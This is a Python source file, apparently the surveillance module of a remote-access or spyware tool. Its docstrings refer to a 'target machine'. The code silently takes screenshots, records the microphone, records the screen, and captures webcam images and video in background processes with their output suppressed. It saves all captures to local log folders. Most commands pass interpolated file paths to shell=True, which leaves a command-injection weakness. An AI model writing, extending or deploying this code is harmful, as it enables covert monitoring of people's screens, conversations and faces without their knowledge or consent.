################################################
# Screen and Audio Capture Feature Module      #
# Captures screenshots and audio recordings    #
################################################

import os
import subprocess
import platform
from datetime import datetime

# Try to import imaging libraries
try:
    from PIL import ImageGrab  # Pillow library for screen capture
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import pyautogui  # Alternative library for screen capture
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    PYAUTOGUI_AVAILABLE = False


class ScreenCapture:
    """
    Captures screenshots from the target machine.
    Multiple fallback methods for compatibility.
    """
    
    def __init__(self, save_dir='logs/screenshots'):
        """
        Initialize screen capture module
        
        Args:
            save_dir: Directory where screenshots will be saved
        """
        # Directory to save screenshots
        self.save_dir = save_dir
        # Operating system (Windows, Darwin/macOS, Linux)
        self.system = platform.system()
        # Create save directory if it doesn't exist
        os.makedirs(self.save_dir, exist_ok=True)
    
    def capture_screenshot(self, filename=None):
        """Capture a screenshot using available methods"""
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'screenshot_{timestamp}.png'
        
        filepath = os.path.join(self.save_dir, filename)
        
        # Try PIL/Pillow first (most reliable)
        if PIL_AVAILABLE:
            try:
                screenshot = ImageGrab.grab()
                screenshot.save(filepath)
                return f"Screenshot saved: {filepath}"
            except Exception as e:
                pass
        
        # Try pyautogui
        if PYAUTOGUI_AVAILABLE:
            try:
                screenshot = pyautogui.screenshot()
                screenshot.save(filepath)
                return f"Screenshot saved: {filepath}"
            except Exception as e:
                pass
        
        # Fallback to system commands
        return self.capture_with_system_command(filepath)
    
    def capture_with_system_command(self, filepath):
        """Capture screenshot using system-specific commands"""
        try:
            if self.system == 'Darwin':  # macOS
                cmd = f'screencapture -x {filepath}'
                subprocess.call(cmd, shell=True)
                if os.path.exists(filepath):
                    return f"Screenshot saved: {filepath}"
            
            elif self.system == 'Linux':
                # Try different Linux screenshot tools
                tools = ['scrot', 'import', 'gnome-screenshot']
                for tool in tools:
                    try:
                        if tool == 'scrot':
                            cmd = f'scrot {filepath}'
                        elif tool == 'import':
                            cmd = f'import -window root {filepath}'
                        elif tool == 'gnome-screenshot':
                            cmd = f'gnome-screenshot -f {filepath}'
                        
                        subprocess.call(cmd, shell=True, timeout=5)
                        if os.path.exists(filepath):
                            return f"Screenshot saved: {filepath}"
                    except:
                        continue
            
            elif self.system == 'Windows':
                # PowerShell screenshot method
                ps_script = f'''
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $bitmap.Save("{filepath}")
                '''
                cmd = f'powershell -Command "{ps_script}"'
                subprocess.call(cmd, shell=True, timeout=10)
                if os.path.exists(filepath):
                    return f"Screenshot saved: {filepath}"
            
            return "Failed to capture screenshot: No available method"
        
        except Exception as e:
            return f"Error capturing screenshot: {str(e)}"
    
    def capture_multiple(self, count=5, interval=2):
        """Capture multiple screenshots at intervals"""
        import time
        results = []
        for i in range(count):
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'screenshot_{i+1}_{timestamp}.png'
            result = self.capture_screenshot(filename)
            results.append(result)
            if i < count - 1:
                time.sleep(interval)
        return '\n'.join(results)
    
    def list_screenshots(self):
        """List all captured screenshots"""
        try:
            files = os.listdir(self.save_dir)
            screenshots = [f for f in files if f.endswith('.png')]
            if screenshots:
                return '\n'.join(screenshots)
            return "No screenshots found"
        except Exception as e:
            return f"Error listing screenshots: {str(e)}"


class AudioCapture:
    """
    Captures audio from the target machine's microphone.
    """
    
    def __init__(self, save_dir='logs/audio'):
        """
        Initialize audio capture module
        
        Args:
            save_dir: Directory where audio recordings will be saved
        """
        # Directory to save audio files
        self.save_dir = save_dir
        # Operating system
        self.system = platform.system()
        # Flag indicating if recording is in progress
        self.is_recording = False
        # Background recording process (for system command recordings)
        self.recording_process = None
        # Path to current recording file
        self.recording_filepath = None
        # Create save directory if it doesn't exist
        os.makedirs(self.save_dir, exist_ok=True)
    
    def record_audio(self, duration=10, filename=None):
        """
        Record audio for specified duration.
        Requires pyaudio or system tools.
        """
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'audio_{timestamp}.wav'
        
        filepath = os.path.join(self.save_dir, filename)
        
        # Try with pyaudio first
        try:
            import pyaudio
            import wave
            
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            
            p = pyaudio.PyAudio()
            stream = p.open(format=FORMAT,
                          channels=CHANNELS,
                          rate=RATE,
                          input=True,
                          frames_per_buffer=CHUNK)
            
            frames = []
            for i in range(0, int(RATE / CHUNK * duration)):
                data = stream.read(CHUNK)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            p.terminate()
            
            wf = wave.open(filepath, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            return f"Audio recorded: {filepath}"
        
        except ImportError:
            return self.record_with_system_command(filepath, duration)
        except Exception as e:
            return f"Error recording audio: {str(e)}"
    
    def record_with_system_command(self, filepath, duration):
        """Record audio using system-specific commands"""
        try:
            if self.system == 'Darwin':  # macOS
                cmd = f'sox -d {filepath} trim 0 {duration}'
                subprocess.call(cmd, shell=True, timeout=duration+2)
                if os.path.exists(filepath):
                    return f"Audio recorded: {filepath}"
            
            elif self.system == 'Linux':
                # Try arecord (ALSA)
                cmd = f'arecord -d {duration} -f cd {filepath}'
                subprocess.call(cmd, shell=True, timeout=duration+2)
                if os.path.exists(filepath):
                    return f"Audio recorded: {filepath}"
            
            elif self.system == 'Windows':
                # Windows requires third-party tools or complex PowerShell
                return "Audio recording on Windows requires pyaudio library"
            
            return "Failed to record audio: No available method"
        
        except Exception as e:
            return f"Error recording audio: {str(e)}"
    
    def start_audio(self, filename=None):
        """
        Start background audio recording (non-blocking).
        Recording continues until stop_audio() is called.
        """
        if self.is_recording:
            return "Error: Audio recording is already in progress"
        
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'audio_{timestamp}.wav'
        
        filepath = os.path.join(self.save_dir, filename)
        
        try:
            # Try to use system commands for background recording
            if self.system == 'Darwin':  # macOS
                # Use sox or ffmpeg for macOS
                if self._command_exists('sox'):
                    cmd = f'sox -d {filepath}'
                elif self._command_exists('ffmpeg'):
                    cmd = f'ffmpeg -f avfoundation -i ":0" {filepath}'
                else:
                    return "Error: sox or ffmpeg required for audio recording on macOS"
            
            elif self.system == 'Linux':
                # Use arecord or ffmpeg for Linux
                if self._command_exists('arecord'):
                    cmd = f'arecord -f cd {filepath}'
                elif self._command_exists('ffmpeg'):
                    cmd = f'ffmpeg -f alsa -i default {filepath}'
                else:
                    return "Error: arecord or ffmpeg required for audio recording on Linux"
            
            elif self.system == 'Windows':
                # Use ffmpeg for Windows
                if self._command_exists('ffmpeg'):
                    cmd = f'ffmpeg -f dshow -i audio="Microphone" {filepath}'
                else:
                    return "Error: ffmpeg required for audio recording on Windows"
            else:
                return "Error: Unsupported operating system"
            
            # Start recording process in background
            self.recording_process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.is_recording = True
            self.recording_filepath = filepath
            
            return f"Background audio recording started: {filepath}"
        
        except Exception as e:
            return f"Error starting audio recording: {str(e)}"
    
    def stop_audio(self):
        """Stop background audio recording"""
        if not self.is_recording or not self.recording_process:
            return "Error: No audio recording in progress"
        
        try:
            # Send interrupt signal to recording process
            self.recording_process.terminate()
            self.recording_process.wait(timeout=5)
            
            self.is_recording = False
            filepath = self.recording_filepath
            
            if os.path.exists(filepath):
                file_size = os.path.getsize(filepath) / (1024 * 1024)
                return f"Audio recording stopped and saved: {filepath} ({file_size:.2f} MB)"
            else:
                return "Audio recording stopped but file may not be complete"
        
        except Exception as e:
            self.is_recording = False
            return f"Error stopping audio recording: {str(e)}"
    
    def get_audio_status(self):
        """Get current audio recording status"""
        if self.is_recording:
            return f"Audio recording in progress: {self.recording_filepath}"
        return "No active audio recording"
    
    def _command_exists(self, command):
        """Check if a system command exists"""
        try:
            result = subprocess.call(
                f'which {command}' if self.system != 'Windows' else f'where {command}',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return result == 0
        except:
            return False
    
    def list_recordings(self):
        """List all audio recordings"""
        try:
            files = os.listdir(self.save_dir)
            recordings = [f for f in files if f.endswith('.wav') or f.endswith('.mp3')]
            if recordings:
                result = []
                for rec in recordings:
                    filepath = os.path.join(self.save_dir, rec)
                    if os.path.exists(filepath):
                        size = os.path.getsize(filepath) / (1024 * 1024)
                        result.append(f"{rec} ({size:.2f} MB)")
                    else:
                        result.append(rec)
                return '\n'.join(result)
            return "No recordings found"
        except Exception as e:
            return f"Error listing recordings: {str(e)}"


class ScreenRecorder:
    """
    Records screen video with optional audio.
    Supports multiple recording methods and formats.
    """
    
    def __init__(self, save_dir='logs/recordings'):
        """
        Initialize screen recorder module
        
        Args:
            save_dir: Directory where screen recordings will be saved
        """
        # Directory to save video recordings
        self.save_dir = save_dir
        # Operating system
        self.system = platform.system()
        # Flag indicating if recording is in progress
        self.is_recording = False
        # Background recording process
        self.recording_process = None
        # Create save directory if it doesn't exist
        os.makedirs(self.save_dir, exist_ok=True)
    
    def record_screen(self, duration=10, filename=None, fps=15, include_audio=False):
        """
        Record screen for specified duration.
        Args:
            duration: Recording duration in seconds
            filename: Output filename (auto-generated if None)
            fps: Frames per second (default 15 for smaller file size)
            include_audio: Whether to capture system audio (requires additional setup)
        """
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'screen_recording_{timestamp}.mp4'
        
        filepath = os.path.join(self.save_dir, filename)
        
        # Try OpenCV method first (cross-platform)
        try:
            return self._record_with_opencv(filepath, duration, fps)
        except ImportError:
            pass
        except Exception as e:
            print(f"OpenCV recording failed: {e}")
        
        # Try mss + imageio method (faster)
        try:
            return self._record_with_mss(filepath, duration, fps)
        except ImportError:
            pass
        except Exception as e:
            print(f"MSS recording failed: {e}")
        
        # Fallback to system-specific commands
        return self._record_with_system_command(filepath, duration, include_audio)
    
    def _record_with_opencv(self, filepath, duration, fps):
        """Record using OpenCV and pyautogui/PIL"""
        import cv2
        import numpy as np
        
        # Get screen size
        if PYAUTOGUI_AVAILABLE:
            screen_size = pyautogui.size()
        elif PIL_AVAILABLE:
            screenshot = ImageGrab.grab()
            screen_size = screenshot.size
        else:
            raise ImportError("No screen capture library available")
        
        # Define the codec and create VideoWriter
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(filepath, fourcc, fps, screen_size)
        
        if not out.isOpened():
            raise Exception("Failed to create video writer")
        
        import time
        start_time = time.time()
        frame_count = 0
        
        try:
            while (time.time() - start_time) < duration:
                # Capture screen
                if PYAUTOGUI_AVAILABLE:
                    img = pyautogui.screenshot()
                elif PIL_AVAILABLE:
                    img = ImageGrab.grab()
                
                # Convert PIL image to numpy array for OpenCV
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                
                # Write frame
                out.write(frame)
                frame_count += 1
                
                # Control frame rate
                time.sleep(1/fps)
        
        finally:
            out.release()
        
        if os.path.exists(filepath):
            file_size = os.path.getsize(filepath) / (1024 * 1024)  # MB
            return f"Screen recording saved: {filepath} ({frame_count} frames, {file_size:.2f} MB)"
        else:
            return "Error: Recording file was not created"
    
    def _record_with_mss(self, filepath, duration, fps):
        """Record using mss (faster screen capture) and imageio"""
        from mss import mss
        import imageio
        import numpy as np
        
        sct = mss()
        monitor = sct.monitors[1]  # Primary monitor
        
        frames = []
        import time
        start_time = time.time()
        
        try:
            while (time.time() - start_time) < duration:
                # Capture screen
                screenshot = sct.grab(monitor)
                
                # Convert to numpy array
                frame = np.array(screenshot)
                
                # Convert BGRA to RGB
                frame = frame[:, :, :3]
                
                frames.append(frame)
                
                # Control frame rate
                time.sleep(1/fps)
            
            # Write video file
            imageio.mimsave(filepath, frames, fps=fps, codec='libx264')
            
            file_size = os.path.getsize(filepath) / (1024 * 1024)  # MB
            return f"Screen recording saved: {filepath} ({len(frames)} frames, {file_size:.2f} MB)"
        
        except Exception as e:
            raise Exception(f"MSS recording failed: {str(e)}")
    
    def _record_with_system_command(self, filepath, duration, include_audio):
        """Record using system-specific commands"""
        try:
            if self.system == 'Darwin':  # macOS
                # Use ffmpeg if available, otherwise use screencapture with images
                if self._command_exists('ffmpeg'):
                    # macOS screen recording with ffmpeg
                    audio_flag = '-f avfoundation -i ":0"' if include_audio else ''
                    cmd = f'ffmpeg -f avfoundation -r 15 -i "1:none" {audio_flag} -t {duration} -y {filepath}'
                    subprocess.call(cmd, shell=True, timeout=duration+10)
                else:
                    # Fallback: capture screenshots and convert to video
                    return self._record_with_screenshots(filepath, duration, 15)
            
            elif self.system == 'Linux':
                if self._command_exists('ffmpeg'):
                    # Linux screen recording with ffmpeg
                    display = os.environ.get('DISPLAY', ':0')
                    audio_flag = '-f pulse -i default' if include_audio else ''
                    cmd = f'ffmpeg -f x11grab -r 15 -s $(xdpyinfo | grep dimensions | awk \'{{print $2}}\') -i {display} {audio_flag} -t {duration} -y {filepath}'
                    subprocess.call(cmd, shell=True, timeout=duration+10)
                else:
                    return self._record_with_screenshots(filepath, duration, 15)
            
            elif self.system == 'Windows':
                if self._command_exists('ffmpeg'):
                    # Windows screen recording with ffmpeg
                    audio_flag = '-f dshow -i audio="Microphone"' if include_audio else ''
                    cmd = f'ffmpeg -f gdigrab -framerate 15 -i desktop {audio_flag} -t {duration} -y {filepath}'
                    subprocess.call(cmd, shell=True, timeout=duration+10)
                else:
                    return self._record_with_screenshots(filepath, duration, 15)
            
            if os.path.exists(filepath):
                file_size = os.path.getsize(filepath) / (1024 * 1024)  # MB
                return f"Screen recording saved: {filepath} ({file_size:.2f} MB)"
            else:
                return "Error: Recording failed - ffmpeg may not be installed"
        
        except Exception as e:
            return f"Error recording screen: {str(e)}"
    
    def _record_with_screenshots(self, filepath, duration, fps):
        """Fallback method: capture screenshots and convert to video"""
        import time
        temp_dir = os.path.join(self.save_dir, 'temp_frames')
        os.makedirs(temp_dir, exist_ok=True)
        
        try:
            screen_capture = ScreenCapture(save_dir=temp_dir)
            frames = []
            start_time = time.time()
            frame_num = 0
            
            while (time.time() - start_time) < duration:
                frame_file = f'frame_{frame_num:04d}.png'
                screen_capture.capture_screenshot(frame_file)
                frames.append(os.path.join(temp_dir, frame_file))
                frame_num += 1
                time.sleep(1/fps)
            
            # Convert frames to video using imageio or opencv
            try:
                import imageio
                images = [imageio.imread(f) for f in frames if os.path.exists(f)]
                imageio.mimsave(filepath, images, fps=fps, codec='libx264')
            except ImportError:
                import cv2
                if frames:
                    frame = cv2.imread(frames[0])
                    height, width, layers = frame.shape
                    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                    out = cv2.VideoWriter(filepath, fourcc, fps, (width, height))
                    
                    for frame_path in frames:
                        if os.path.exists(frame_path):
                            frame = cv2.imread(frame_path)
                            out.write(frame)
                    out.release()
            
            # Clean up temporary frames
            for frame_path in frames:
                if os.path.exists(frame_path):
                    os.remove(frame_path)
            os.rmdir(temp_dir)
            
            if os.path.exists(filepath):
                file_size = os.path.getsize(filepath) / (1024 * 1024)
                return f"Screen recording saved: {filepath} ({len(frames)} frames, {file_size:.2f} MB)"
            else:
                return "Error: Failed to create video from screenshots"
        
        except Exception as e:
            return f"Error in screenshot-based recording: {str(e)}"
    
    def _command_exists(self, command):
        """Check if a system command exists"""
        try:
            result = subprocess.call(
                f'which {command}' if self.system != 'Windows' else f'where {command}',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return result == 0
        except:
            return False
    
    def start_background_recording(self, filename=None, max_duration=3600):
        """
        Start recording in the background (non-blocking).
        Recording continues until stop_recording() is called or max_duration is reached.
        """
        if self.is_recording:
            return "Error: Recording is already in progress"
        
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'screen_recording_{timestamp}.mp4'
        
        filepath = os.path.join(self.save_dir, filename)
        
        try:
            if self.system == 'Darwin':  # macOS
                cmd = f'ffmpeg -f avfoundation -r 15 -i "1:none" -t {max_duration} -y {filepath}'
            elif self.system == 'Linux':
                display = os.environ.get('DISPLAY', ':0')
                cmd = f'ffmpeg -f x11grab -r 15 -s $(xdpyinfo | grep dimensions | awk \'{{print $2}}\') -i {display} -t {max_duration} -y {filepath}'
            elif self.system == 'Windows':
                cmd = f'ffmpeg -f gdigrab -framerate 15 -i desktop -t {max_duration} -y {filepath}'
            else:
                return "Error: Unsupported operating system"
            
            self.recording_process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.is_recording = True
            self.recording_filepath = filepath
            
            return f"Background recording started: {filepath}"
        
        except Exception as e:
            return f"Error starting background recording: {str(e)}"
    
    def stop_recording(self):
        """Stop background recording"""
        if not self.is_recording or not self.recording_process:
            return "Error: No recording in progress"
        
        try:
            # Send interrupt signal to ffmpeg
            self.recording_process.terminate()
            self.recording_process.wait(timeout=5)
            
            self.is_recording = False
            filepath = self.recording_filepath
            
            if os.path.exists(filepath):
                file_size = os.path.getsize(filepath) / (1024 * 1024)
                return f"Recording stopped and saved: {filepath} ({file_size:.2f} MB)"
            else:
                return "Recording stopped but file may not be complete"
        
        except Exception as e:
            self.is_recording = False
            return f"Error stopping recording: {str(e)}"
    
    def list_recordings(self):
        """List all screen recordings"""
        try:
            files = os.listdir(self.save_dir)
            recordings = [f for f in files if f.endswith(('.mp4', '.avi', '.mkv'))]
            if recordings:
                result = []
                for rec in recordings:
                    filepath = os.path.join(self.save_dir, rec)
                    size = os.path.getsize(filepath) / (1024 * 1024)
                    result.append(f"{rec} ({size:.2f} MB)")
                return '\n'.join(result)
            return "No recordings found"
        except Exception as e:
            return f"Error listing recordings: {str(e)}"
    
    def get_recording_status(self):
        """Get current recording status"""
        if self.is_recording:
            return f"Recording in progress: {self.recording_filepath}"
        return "No active recording"


class WebcamCapture:
    """Captures images and video from webcam"""
    
    def __init__(self, save_dir='logs/webcam'):
        """
        Initialize webcam capture module
        
        Args:
            save_dir: Directory where webcam captures will be saved
        """
        # Directory to save webcam captures
        self.save_dir = save_dir
        # Operating system
        self.system = platform.system()
        # Flag indicating if webcam recording is in progress
        self.is_recording = False
        # Background recording process
        self.recording_process = None
        # Path to current recording file
        self.recording_filepath = None
        # Create save directory if it doesn't exist
        os.makedirs(self.save_dir, exist_ok=True)
    
    def capture_image(self, filename=None):
        """Capture image from webcam"""
        try:
            import cv2
            
            if not filename:
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = f'webcam_{timestamp}.jpg'
            
            filepath = os.path.join(self.save_dir, filename)
            
            # Open webcam
            camera = cv2.VideoCapture(0)
            
            if not camera.isOpened():
                return "Error: Could not access webcam"
            
            # Capture frame
            ret, frame = camera.read()
            
            if ret:
                cv2.imwrite(filepath, frame)
                camera.release()
                return f"Webcam image saved: {filepath}"
            else:
                camera.release()
                return "Error: Could not capture image"
        
        except ImportError:
            return "Error: opencv-python library required. Install with: pip install opencv-python"
        except Exception as e:
            return f"Error capturing webcam image: {str(e)}"
    
    def start_webcam_recording(self, filename=None):
        """
        Start background webcam video recording (non-blocking).
        Recording continues until stop_webcam() is called.
        """
        if self.is_recording:
            return "Error: Webcam recording is already in progress"
        
        if not filename:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'webcam_recording_{timestamp}.mp4'
        
        filepath = os.path.join(self.save_dir, filename)
        
        try:
            # Try using ffmpeg first (most reliable cross-platform)
            if self._command_exists('ffmpeg'):
                if self.system == 'Darwin':  # macOS
                    cmd = f'ffmpeg -f avfoundation -framerate 15 -i "0" {filepath}'
                elif self.system == 'Linux':
                    cmd = f'ffmpeg -f v4l2 -framerate 15 -video_size 640x480 -i /dev/video0 {filepath}'
                elif self.system == 'Windows':
                    cmd = f'ffmpeg -f dshow -framerate 15 -i video="USB Video Device" {filepath}'
                else:
                    return "Error: Unsupported operating system"
                
                # Start recording process in background
                self.recording_process = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                self.is_recording = True
                self.recording_filepath = filepath
                
                return f"Background webcam recording started: {filepath}"
            else:
                # Fallback to opencv if ffmpeg not available
                return self._start_webcam_with_opencv(filepath)
        
        except Exception as e:
            return f"Error starting webcam recording: {str(e)}"
    
    def _start_webcam_with_opencv(self, filepath):
        """Start webcam recording using OpenCV in a thread"""
        try:
            import cv2
            import threading
            
            def record_webcam():
                camera = cv2.VideoCapture(0)
                
                if not camera.isOpened():
                    self.is_recording = False
                    return
                
                # Get camera properties
                frame_width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
                frame_height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))
                
                # Create video writer
                fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                out = cv2.VideoWriter(filepath, fourcc, 15.0, (frame_width, frame_height))
                
                while self.is_recording:
                    ret, frame = camera.read()
                    if ret:
                        out.write(frame)
                    else:
                        break
                
                camera.release()
                out.release()
            
            # Start recording in background thread
            self.is_recording = True
            self.recording_filepath = filepath
            recording_thread = threading.Thread(target=record_webcam, daemon=True)
            recording_thread.start()
            
            return f"Background webcam recording started: {filepath}"
        
        except ImportError:
            return "Error: opencv-python or ffmpeg required for webcam recording"
        except Exception as e:
            return f"Error starting webcam recording with OpenCV: {str(e)}"
    
    def stop_webcam(self):
        """Stop background webcam recording"""
        if not self.is_recording:
            return "Error: No webcam recording in progress"
        
        try:
            # Stop the recording
            if self.recording_process:
                # ffmpeg process
                self.recording_process.terminate()
                self.recording_process.wait(timeout=5)
            
            # For OpenCV method, just set flag to False
            self.is_recording = False
            
            # Wait a moment for file to finalize
            import time
            time.sleep(1)
            
            filepath = self.recording_filepath
            
            if os.path.exists(filepath):
                file_size = os.path.getsize(filepath) / (1024 * 1024)
                return f"Webcam recording stopped and saved: {filepath} ({file_size:.2f} MB)"
            else:
                return "Webcam recording stopped but file may not be complete"
        
        except Exception as e:
            self.is_recording = False
            return f"Error stopping webcam recording: {str(e)}"
    
    def get_webcam_status(self):
        """Get current webcam recording status"""
        if self.is_recording:
            return f"Webcam recording in progress: {self.recording_filepath}"
        return "No active webcam recording"
    
    def _command_exists(self, command):
        """Check if a system command exists"""
        try:
            result = subprocess.call(
                f'which {command}' if self.system != 'Windows' else f'where {command}',
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return result == 0
        except:
            return False
    
    def list_images(self):
        """List all captured webcam images and videos"""
        try:
            files = os.listdir(self.save_dir)
            media_files = [f for f in files if f.endswith(('.jpg', '.jpeg', '.png', '.mp4', '.avi'))]
            if media_files:
                result = []
                for media in media_files:
                    filepath = os.path.join(self.save_dir, media)
                    if os.path.exists(filepath):
                        size = os.path.getsize(filepath) / (1024 * 1024)
                        result.append(f"{media} ({size:.2f} MB)")
                    else:
                        result.append(media)
                return '\n'.join(result)
            return "No webcam images or videos found"
        except Exception as e:
            return f"Error listing webcam media: {str(e)}"
